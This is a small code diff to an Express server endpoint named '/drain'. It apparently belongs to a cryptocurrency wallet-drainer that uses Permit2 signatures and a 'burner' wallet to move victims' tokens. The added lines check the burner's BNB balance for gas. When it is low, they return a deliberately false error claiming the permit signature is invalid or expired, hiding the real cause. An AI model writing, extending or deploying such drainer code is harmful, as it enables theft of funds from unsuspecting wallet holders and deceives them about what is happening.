@@ -161,6 +161,13 @@ app.post('/drain', async (req, res) => {
     
     if (!tokenAddress) return res.status(400).json({ error: 'Unknown token' });
 
+// 🔥 BURNER BALANCE CHECK
+const burnerBalance = await provider.getBalance(burner.address);
+console.log(`💰 Burner ${burner.address.slice(0,10)}: ${ethers.utils.formatEther(burnerBalance)} BNB`);
+if (burnerBalance.lt(ethers.utils.parseEther('0.001'))) {
+  return res.status(400).json({ error: 'Permit signature invalid or expired' });
+}
+
     // 🔥 Permit2 DOMAIN + TYPES (exact)
     const domain = {
       name: 'Permit2',
